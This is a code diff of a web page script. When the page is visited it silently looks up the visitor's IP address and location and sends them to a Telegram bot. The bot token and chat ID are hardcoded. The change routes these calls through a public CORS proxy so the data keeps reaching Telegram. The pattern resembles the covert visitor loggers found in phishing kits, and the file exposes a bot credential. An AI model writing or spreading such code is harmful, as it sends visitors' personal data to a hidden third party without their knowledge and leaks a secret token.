@@ -642,13 +642,13 @@
                 try {
                     console.log('📡 Getting visitor data...');
                     
-                    // Get visitor's IP and country
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    // Get visitor's IP and country using CORS proxy
+                    const ipResponse = await fetch('https://cors-anywhere.herokuapp.com/https://api.ipify.org?format=json');
                     const ipData = await ipResponse.json();
                     const ip = ipData.ip;
                     console.log('🌐 IP:', ip);
                     
-                    const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                    const geoResponse = await fetch(`https://cors-anywhere.herokuapp.com/https://ipapi.co/${ip}/json/`);
                     const geoData = await geoResponse.json();
                     console.log('🌍 Location:', geoData.country_name, geoData.city);
                     
@@ -682,13 +682,14 @@
                     
                     console.log('📤 Sending to Telegram...');
                     
-                    // Send to Telegram
-                    const telegramUrl = 'https://api.telegram.org/bot6961954749:AAFNQxPFGrJZdRQkdkJXcSRvXaKJzOSYPw4/sendMessage';
+                    // Send to Telegram using CORS proxy
+                    const telegramUrl = 'https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot6961954749:AAFNQxPFGrJZdRQkdkJXcSRvXaKJzOSYPw4/sendMessage';
                     
                     const response = await fetch(telegramUrl, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
+                            'X-Requested-With': 'XMLHttpRequest'
                         },
                         body: JSON.stringify({
                             chat_id: '5267894253',
